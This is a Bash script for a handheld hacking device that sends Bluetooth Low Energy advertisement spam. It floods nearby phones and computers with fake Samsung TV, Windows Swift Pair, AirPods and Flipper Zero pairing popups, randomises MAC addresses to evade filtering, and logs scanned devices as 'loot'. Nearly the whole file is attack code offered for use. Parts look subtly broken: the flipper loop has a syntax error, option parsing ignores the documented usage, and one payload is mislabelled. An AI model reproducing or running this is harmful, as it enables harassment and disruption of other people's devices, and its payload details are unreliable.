#!/bin/bash
set -euo pipefail
# /usr/local/bin/ble-spam
# BLE advertisement spam attacks (Wall of Flippers / Swift Pair)
# Adapted from Raspyjack for ZERO-DAY OS Cardputer Zero

LOOT_DIR="/opt/cardputer/loot/bt"
RED='\033[0;31m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

usage() {
    echo -e "${CYAN}ble-spam${NC} — BLE Advertisement Spam for ZERO-DAY OS"
    echo ""
    echo "Usage: sudo ble-spam <attack> [options]"
    echo ""
    echo "Attacks:"
    echo "  samsung_tv           Send Samsung TV popups to nearby devices"
    echo "  swift_pair           Send Windows Swift Pair notifications"
    echo "  air_pod              Fake AirPods pairing notifications"
    echo "  flipper              Flipper Zero device flood"
    echo "  random               Random device advertisement flood"
    echo "  all                  Cycle through all attack types"
    echo "  scan                 Scan for BLE devices (recon first)"
    echo ""
    echo "Options:"
    echo "  -d <duration>        Run for <duration> seconds (default: 30)"
    echo "  -i <iface>           Bluetooth interface (default: hci0)"
    echo "  -c <count>           Number of spam packets per burst (default: 10)"
    echo ""
    echo "Examples:"
    echo "  sudo ble-spam samsung_tv -d 60"
    echo "  sudo ble-spam all -d 120"
    echo "  sudo ble-spam random -c 50"
}

check_deps() {
    if ! command -v bluetoothctl &>/dev/null; then
        echo -e "${RED}[!] bluetoothctl not found. Install: apt install bluez${NC}"
        exit 1
    fi
    if ! command -v hcitool &>/dev/null; then
        echo -e "${RED}[!] hcitool not found. Install: apt install bluez${NC}"
        exit 1
    fi
}

scan_ble() {
    echo -e "${CYAN}[*] Scanning for BLE devices...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    bluetoothctl scan on 2>/dev/null &
    SCAN_PID=$!
    sleep 10
    kill $SCAN_PID 2>/dev/null || true
    echo ""
    echo -e "${GREEN}[*] Scan complete. Devices found:${NC}"
    bluetoothctl devices 2>/dev/null || echo "  (none)"
    mkdir -p "$LOOT_DIR"
    bluetoothctl devices 2>/dev/null > "${LOOT_DIR}/ble_scan_$(date +%Y%m%d_%H%M%S).txt"
}

send_le_adv() {
    local iface="${1:-hci0}"
    local type="$2"
    local data="$3"
    
    # Use hcitool to send LE advertising
    # Format: hcitool -i hciX cmd <ogf> <ocf> <params>
    # LE Set Advertising Data (OCF 0x0008)
    hcitool -i "$iface" cmd 0x08 0x0008 ${data} 2>/dev/null || true
}

spam_samsung_tv() {
    local iface="$1"
    local duration="$2"
    local count="$3"
    
    echo -e "${CYAN}[*] Samsung TV spam starting (${duration}s)${NC}"
    echo -e "${YELLOW}[*] Sending fake Samsung TV notifications...${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local seq=0
    
    while [ $(date +%s) -lt $end_time ]; do
        # Randomize MAC to avoid filtering
        local mac=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        
        # Samsung TV Service Data
        # Service UUID: 0xFD8B (Samsung)
        for i in $(seq 1 "$count"); do
            # LE advertisement with Samsung TV data
            send_le_adv "$iface" "samsung_tv" "1E 02 01 06 03 03 8B FD 14 16 8B FD 64 $(printf '%02x' $((RANDOM%256))) 00 00 00 00 00 00 00 00 00 00 00 00 00"
            seq=$((seq + 1))
            sleep 0.1
        done
        printf "\r${GREEN}[*] Packets sent: %d${NC}" "$seq"
        sleep 0.05
    done
    echo ""
    echo -e "${GREEN}[+] Samsung TV spam complete. Packets: ${seq}${NC}"
}

spam_swift_pair() {
    local iface="$1"
    local duration="$2"
    local count="$3"
    
    echo -e "${CYAN}[*] Swift Pair spam starting (${duration}s)${NC}"
    echo -e "${YELLOW}[*] Sending Windows Swift Pair notifications...${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local seq=0
    
    while [ $(date +%s) -lt $end_time ]; do
        for i in $(seq 1 "$count"); do
            # Microsoft Swift Pair advertisement
            # Service UUID: 0xFD8B with Microsoft payload
            send_le_adv "$iface" "swift_pair" "1E 02 01 06 03 03 8B FD 14 16 8B FD 01 $(printf '%02x' $((RANDOM%256))) $(printf '%02x' $((RANDOM%256))) 00 00 00 00 00 00 00 00 00 00 00 00"
            seq=$((seq + 1))
            sleep 0.1
        done
        printf "\r${GREEN}[*] Packets sent: %d${NC}" "$seq"
        sleep 0.05
    done
    echo ""
    echo -e "${GREEN}[+] Swift Pair spam complete. Packets: ${seq}${NC}"
}

spam_air_pod() {
    local iface="$1"
    local duration="$2"
    local count="$3"
    
    echo -e "${CYAN}[*] AirPods spam starting (${duration}s)${NC}"
    echo -e "${YELLOW}[*] Sending fake AirPods proximity pairing...${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local seq=0
    
    while [ $(date +%s) -lt $end_time ]; do
        for i in $(seq 1 "$count"); do
            # Apple Nearby Info advertisement (AirPods)
            # Random MAC prefix for variety
            local prefix=$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
            send_le_adv "$iface" "airpod" "1E 02 01 1B 07 FF 4C 00 07 19 07 $(printf '%02x' $((RANDOM%256))) 55 $(printf '%02x' $((RANDOM%256))) 00 00 00 00 00 00 00 00 00 00 00 00"
            seq=$((seq + 1))
            sleep 0.1
        done
        printf "\r${GREEN}[*] Packets sent: %d${NC}" "$seq"
        sleep 0.05
    done
    echo ""
    echo -e "${GREEN}[+] AirPods spam complete. Packets: ${seq}${NC}"
}

spam_flipper() {
    local iface="$1"
    local duration="$2"
    local count="$3"
    
    echo -e "${CYAN}[*] Flipper Zero flood starting (${duration}s)${NC}"
    echo -e "${YELLOW}[*] Sending Flipper Zero device advertisements...${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local seq=0
    
    while [ $(date +%s) -lt $end_time ]; do
        for i in$(seq 1 "$count"); do
            # Flipper Zero BLE advertisement
            # Service UUID: 0xF0D0 (Flipper)
            local id=$(printf '%02x%02x%02x%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
            send_le_adv "$iface" "flipper" "0E 02 01 06 06 03 F0 D0 01 ${id:0:2} ${id:2:2} ${id:4:2} ${id:6:2}"
            seq=$((seq + 1))
            sleep 0.05
        done
        printf "\r${GREEN}[*] Packets sent: %d${NC}" "$seq"
        sleep 0.01
    done
    echo ""
    echo -e "${GREEN}[+] Flipper flood complete. Packets: ${seq}${NC}"
}

spam_random() {
    local iface="$1"
    local duration="$2"
    local count="$3"
    
    echo -e "${CYAN}[*] Random BLE advertisement flood (${duration}s)${NC}"
    
    local end_time=$(($(date +%s) + duration))
    local seq=0
    local types=("samsung_tv" "swift_pair" "airpod" "flipper")
    
    while [ $(date +%s) -lt $end_time ]; do
        local attack_type=${types[$((RANDOM % ${#types[@]}))]}
        case "$attack_type" in
            samsung_tv) spam_samsung_tv "$iface" 1 "$count" ;;
            swift_pair) spam_swift_pair "$iface" 1 "$count" ;;
            airpod)     spam_air_pod "$iface" 1 "$count" ;;
            flipper)    spam_flipper "$iface" 1 "$count" ;;
        esac
        seq=$((seq + count))
    done
    echo -e "${GREEN}[+] Random spam complete. Total packets: ${seq}${NC}"
}

# Main
check_deps
mkdir -p "$LOOT_DIR"

DURATION=30
IFACE="hci0"
COUNT=10

while getopts "d:i:c:" opt; do
    case $opt in
        d) DURATION="$OPTARG" ;;
        i) IFACE="$OPTARG" ;;
        c) COUNT="$OPTARG" ;;
        *) usage; exit 1 ;;
    esac
done
shift $((OPTIND - 1))

# Make sure BT is up
rfkill unblock bluetooth 2>/dev/null || true
hciconfig "$IFACE" up 2>/dev/null || true

case "${1:-}" in
    samsung_tv)     spam_samsung_tv "$IFACE" "$DURATION" "$COUNT" ;;
    swift_pair)     spam_swift_pair "$IFACE" "$DURATION" "$COUNT" ;;
    air_pod)        spam_air_pod "$IFACE" "$DURATION" "$COUNT" ;;
    flipper)         spam_flipper "$IFACE" "$DURATION" "$COUNT" ;;
    random)         spam_random "$IFACE" "$DURATION" "$COUNT" ;;
    all)            spam_random "$IFACE" "$DURATION" "$COUNT" ;;
    scan)           scan_ble ;;
    *)              usage ;;
esac